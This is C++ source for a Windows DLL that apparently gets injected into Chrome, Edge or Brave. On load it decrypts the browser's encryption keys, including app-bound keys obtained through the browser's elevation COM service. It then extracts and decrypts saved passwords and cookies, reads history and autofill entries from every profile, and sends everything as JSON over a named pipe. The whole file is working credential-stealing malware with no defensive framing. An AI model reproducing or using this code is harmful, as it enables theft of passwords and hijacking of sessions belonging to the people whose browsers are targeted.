#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <thread>
#include <chrono>
#include "json.hpp"
#include "sqlite3.h"

using json = nlohmann::json;
namespace fs = std::filesystem;

// Forward declarations for COM interfaces
typedef struct IElevator IElevator;
typedef struct IEdgeElevator IEdgeElevator;

enum class Browser { Chrome, Edge, Brave };

// COM related constants and structs
const GUID CLSID_CHROME_ELEVATOR = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } };
const GUID IID_CHROME_IELEVATOR1 = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } };
const GUID IID_CHROME_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } };

const GUID CLSID_EDGE_ELEVATOR = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } };
const GUID IID_EDGE_IELEVATOR1 = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B } };
const GUID IID_EDGE_IELEVATOR2 = { 0x8F7B6792, 0x784D, 0x4047, { 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05 } };

const GUID CLSID_BRAVE_ELEVATOR = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } };
const GUID IID_BRAVE_IELEVATOR1 = { 0xF396861E, 0x0C8E, 0x4C71, { 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 } };
const GUID IID_BRAVE_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } };

struct IElevatorVTbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IElevator*, const GUID*, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(IElevator*);
    ULONG (STDMETHODCALLTYPE *Release)(IElevator*);
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(IElevator*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, DWORD*);
    HRESULT (STDMETHODCALLTYPE *EncryptData)(IElevator*, DWORD, BSTR, BSTR*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *DecryptData)(IElevator*, BSTR, BSTR*, DWORD*);
};

struct IElevator {
    IElevatorVTbl* lpVtbl;
};

struct IEdgeElevatorVTbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IEdgeElevator*, const GUID*, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(IEdgeElevator*);
    ULONG (STDMETHODCALLTYPE *Release)(IEdgeElevator*);
    HRESULT (STDMETHODCALLTYPE *EdgeBaseMethod1)(IEdgeElevator*);
    HRESULT (STDMETHODCALLTYPE *EdgeBaseMethod2)(IEdgeElevator*);
    HRESULT (STDMETHODCALLTYPE *EdgeBaseMethod3)(IEdgeElevator*);
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(IEdgeElevator*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, DWORD*);
    HRESULT (STDMETHODCALLTYPE *EncryptData)(IEdgeElevator*, DWORD, BSTR, BSTR*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *DecryptData)(IEdgeElevator*, BSTR, BSTR*, DWORD*);
};

struct IEdgeElevator {
    IEdgeElevatorVTbl* lpVtbl;
};

std::vector<BYTE> decrypt_dpapi(const std::vector<BYTE>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, NULL };
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        std::vector<BYTE> result(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return result;
    }
    return {};
}

std::vector<BYTE> decrypt_with_elevator(const std::vector<BYTE>& encrypted_blob, Browser browser) {
    GUID clsid;
    std::vector<GUID> iids;
    if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
    else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};

    std::vector<BYTE> result;
    void* elevator_ptr = NULL;
    for (auto& iid : iids) {
        hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, &elevator_ptr);
        if (SUCCEEDED(hr)) break;
    }

    if (SUCCEEDED(hr)) {
        BSTR bstr_enc = SysAllocStringByteLen((const char*)encrypted_blob.data(), encrypted_blob.size());
        BSTR bstr_dec = NULL;
        DWORD last_error = 0;

        if (browser == Browser::Edge) {
            IEdgeElevator* edge = (IEdgeElevator*)elevator_ptr;
            hr = edge->lpVtbl->DecryptData(edge, bstr_enc, &bstr_dec, &last_error);
        } else {
            IElevator* chrome = (IElevator*)elevator_ptr;
            hr = chrome->lpVtbl->DecryptData(chrome, bstr_enc, &bstr_dec, &last_error);
        }

        if (SUCCEEDED(hr) && bstr_dec) {
            result.assign((BYTE*)bstr_dec, (BYTE*)bstr_dec + SysStringByteLen(bstr_dec));
            SysFreeString(bstr_dec);
        }
        SysFreeString(bstr_enc);
        ((IUnknown*)elevator_ptr)->Release();
    }

    CoUninitialize();
    return result;
}

#include <wincrypt.h>
#pragma comment(lib, "bcrypt.lib")

std::vector<BYTE> aes_gcm_decrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& data) {
    if (data.size() < 15) return {};

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return {};
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) < 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return {}; }

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (DWORD)key.size(), 0) < 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return {}; }

    BCRYPT_INIT_AUTH_INFO(authInfo);
    authInfo.pbNonce = (PBYTE)&data[3];
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PBYTE)&data[data.size() - 16];
    authInfo.cbTag = 16;

    DWORD cbPlaintext = (DWORD)data.size() - 15 - 16;
    std::vector<BYTE> plaintext(cbPlaintext);
    DWORD cbResult = 0;

    if (BCryptDecrypt(hKey, (PBYTE)&data[15], cbPlaintext, &authInfo, NULL, 0, plaintext.data(), cbPlaintext, &cbResult, 0) < 0) {
        plaintext.clear();
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return plaintext;
}

Browser get_browser() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    std::wstring ws(path);
    for (auto& c : ws) c = towlower(c);
    if (ws.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (ws.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    return Browser::Chrome;
}

std::string base64_decode(const std::string& in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

void do_work() {
    Browser browser = get_browser();
    char* user_profile_env = getenv("USERPROFILE");
    if (!user_profile_env) return;
    fs::path user_profile(user_profile_env);
    fs::path data_path;

    if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
    else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
    else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";

    std::vector<BYTE> v10_key, v20_key;
    std::ifstream local_state_file(data_path / "Local State");
    if (local_state_file.is_open()) {
        json j;
        local_state_file >> j;
        if (j.contains("os_crypt") && j["os_crypt"].contains("encrypted_key")) {
            std::string key_b64 = j["os_crypt"]["encrypted_key"];
            std::string decoded = base64_decode(key_b64);
            if (decoded.size() > 5 && memcmp(decoded.data(), "DPAPI", 5) == 0) {
                std::vector<BYTE> enc_key(decoded.begin() + 5, decoded.end());
                v10_key = decrypt_dpapi(enc_key);
            }
        }
        std::string v20_b64 = "";
        if (j.contains("app_bound_encrypted_key")) v20_b64 = j["app_bound_encrypted_key"];
        else if (j.contains("os_crypt") && j["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = j["os_crypt"]["app_bound_encrypted_key"];

        if (!v20_b64.empty()) {
            std::string decoded = base64_decode(v20_b64);
            std::vector<BYTE> blob;
            if (decoded.size() > 4 && memcmp(decoded.data(), "APPB", 4) == 0) blob.assign(decoded.begin() + 4, decoded.end());
            else blob.assign(decoded.begin(), decoded.end());
            v20_key = decrypt_with_elevator(blob, browser);
        }
    }

    std::vector<std::string> profiles = { "Default" };
    for (auto& entry : fs::directory_iterator(data_path)) {
        if (entry.is_directory()) {
            std::string name = entry.path().filename().string();
            if (name.find("Profile ") == 0) profiles.push_back(name);
        }
    }

    json collected = json::array();
    fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
    fs::create_directories(temp_dir);

    for (auto& profile : profiles) {
        fs::path p_path = data_path / profile;
        json p_data;
        p_data["name"] = profile;
        p_data["passwords"] = json::array();
        p_data["cookies"] = json::array();
        p_data["history"] = json::array();
        p_data["autofill"] = json::array();

        // Passwords
        fs::path db_pass = p_path / "Login Data";
        fs::path tmp_pass = temp_dir / "pass.tmp";
        if (fs::exists(db_pass)) {
            fs::copy_file(db_pass, tmp_pass, fs::copy_options::overwrite_existing);
            sqlite3* db;
            if (sqlite3_open(tmp_pass.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* url = (const char*)sqlite3_column_text(stmt, 0);
                        const char* user = (const char*)sqlite3_column_text(stmt, 1);
                        int pass_size = sqlite3_column_bytes(stmt, 2);
                        const BYTE* pass_data = (const BYTE*)sqlite3_column_blob(stmt, 2);

                        std::vector<BYTE> encrypted(pass_data, pass_data + pass_size);
                        std::vector<BYTE> key = (encrypted.size() >= 3 && memcmp(encrypted.data(), "v20", 3) == 0) ? v20_key : v10_key;

                        if (!key.empty()) {
                            std::vector<BYTE> dec = aes_gcm_decrypt(key, encrypted);
                            p_data["passwords"].push_back({{"url", url ? url : ""}, {"username", user ? user : ""}, {"password", std::string(dec.begin(), dec.end())}});
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }

        // Cookies
        fs::path db_cook = p_path / "Network/Cookies";
        fs::path tmp_cook = temp_dir / "cook.tmp";
        if (fs::exists(db_cook)) {
            fs::copy_file(db_cook, tmp_cook, fs::copy_options::overwrite_existing);
            sqlite3* db;
            if (sqlite3_open(tmp_cook.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* name = (const char*)sqlite3_column_text(stmt, 1);
                        int val_size = sqlite3_column_bytes(stmt, 2);
                        const BYTE* val_data = (const BYTE*)sqlite3_column_blob(stmt, 2);

                        std::vector<BYTE> encrypted(val_data, val_data + val_size);
                        bool is_v20 = (encrypted.size() >= 3 && memcmp(encrypted.data(), "v20", 3) == 0);
                        std::vector<BYTE> key = is_v20 ? v20_key : v10_key;

                        if (!key.empty()) {
                            std::vector<BYTE> dec = aes_gcm_decrypt(key, encrypted);
                            if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                            p_data["cookies"].push_back({{"host", host ? host : ""}, {"name", name ? name : ""}, {"value", std::string(dec.begin(), dec.end())}});
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }

        // History
        fs::path db_hist = p_path / "History";
        fs::path tmp_hist = temp_dir / "hist.tmp";
        if (fs::exists(db_hist)) {
            fs::copy_file(db_hist, tmp_hist, fs::copy_options::overwrite_existing);
            sqlite3* db;
            if (sqlite3_open(tmp_hist.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* url = (const char*)sqlite3_column_text(stmt, 0);
                        const char* title = (const char*)sqlite3_column_text(stmt, 1);
                        int visits = sqlite3_column_int(stmt, 2);
                        p_data["history"].push_back({{"url", url ? url : ""}, {"title", title ? title : ""}, {"visit_count", visits}});
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }

        // Autofill
        fs::path db_web = p_path / "Web Data";
        fs::path tmp_web = temp_dir / "web.tmp";
        if (fs::exists(db_web)) {
            fs::copy_file(db_web, tmp_web, fs::copy_options::overwrite_existing);
            sqlite3* db;
            if (sqlite3_open(tmp_web.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* name = (const char*)sqlite3_column_text(stmt, 0);
                        const char* val = (const char*)sqlite3_column_text(stmt, 1);
                        p_data["autofill"].push_back({{"name", name ? name : ""}, {"value", val ? val : ""}});
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
        collected.push_back(p_data);
    }

    HANDLE h_pipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < 30; i++) {
        h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h_pipe != INVALID_HANDLE_VALUE) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (h_pipe != INVALID_HANDLE_VALUE) {
        std::string s = collected.dump();
        DWORD written;
        WriteFile(h_pipe, s.data(), (DWORD)s.size(), &written, NULL);
        CloseHandle(h_pipe);
    }
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        std::thread(do_work).detach();
    }
    return TRUE;
}
